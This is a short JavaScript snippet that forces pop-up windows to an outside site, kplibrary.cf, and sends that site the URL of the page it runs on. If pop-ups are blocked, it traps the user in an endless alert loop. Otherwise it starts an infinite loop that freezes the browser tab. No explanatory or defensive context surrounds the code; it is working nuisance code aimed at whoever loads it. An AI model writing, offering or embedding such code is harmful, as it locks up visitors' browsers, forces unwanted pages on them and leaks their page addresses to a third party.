var windowName = 'userConsole';
var popUp = window.open("http://kplibrary.cf/", '_blank', 'toolbar=0,location=0,menubar=0');
if (popUp == null || typeof(popUp) == 'undefined') {
  while (true) {
    alert("Thicc Katz")
  }
} else {
  window.open("http://kplibrary.cf/")
    //: Opens new tab of kplibrary.cf^
  var strWindowFeatures = "location=yes,height=670,width=620,scrollbars=yes,status=yes";
  var URL = "http://kplibrary.cf/" + location.href;
  var win = window.open(URL, "_blank", strWindowFeatures);
  setTimeout(function() {
    for (var i = 0; i === i; i++) {}
  }, 50);
}
